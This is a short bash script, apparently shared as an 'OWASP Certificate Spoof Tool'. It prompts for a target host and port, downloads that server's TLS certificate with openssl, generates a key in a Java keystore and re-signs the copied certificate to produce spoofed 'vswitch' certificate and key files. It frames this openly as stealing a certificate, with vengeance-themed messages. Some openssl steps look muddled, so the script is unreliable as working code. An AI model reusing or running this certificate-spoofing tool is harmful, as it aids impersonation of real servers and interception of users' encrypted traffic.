#!/bin/bash
echo "OWASP Certificate Spoof Tool"
echo "By Gdisney-leugers"
echo "Host to steal cert from:"
read host
echo "Host SSL port:"
read port
echo "Keystore:"
read ks
echo "Password: (Must be at least 6 characters)"
read passwd;
mkdir ca/
cd ca/
keyring=$(uuidgen)
openssl s_client -showcerts -connect $host:$port > $keyring.pem;
openssl x509 -trustout -in $keyring.pem -pubkey > $keyring.cer;
keytool -keystore $ks --importcert --alias $keyring.pem -file $keyring.pem -storepass $passwd -noprompt;
keytool -genkey -alias $keyring.key -keyalg RSA -keystore $ks -storepass $passwd -noprompt
keytool -v -importkeystore -srckeystore $ks -srcalias $keyring.key -destkeystore $keyring.p12 -file $keyring.p12 -deststoretype PKCS12 -storepass $passwd -noprompt
openssl pkcs12 -in $keyring.p12 -out $keyring.key -passin pass:$passwd
echo "Stealing CA"
cat $keyring.cer >> $keyring.pem
echo "Spoofed Public Key"
cat $keyring.key >> $keyring.pem
openssl x509 -trustout -inform pem -in $keyring.pem -out ca-$keyring.crt -signkey $keyring.key -CA $keyring.key -CAcreateserial -passin pass:$passwd
openssl x509 -in ca-$keyring.crt -out vswitch.crt
mv $keyring.key vswitch.key
mv $keyring.cer collide.cer
mv $keyring.p12 vswitch.p12
echo "Spoof Complete"
echo "V is for Vengeance; The Vengeance Switch"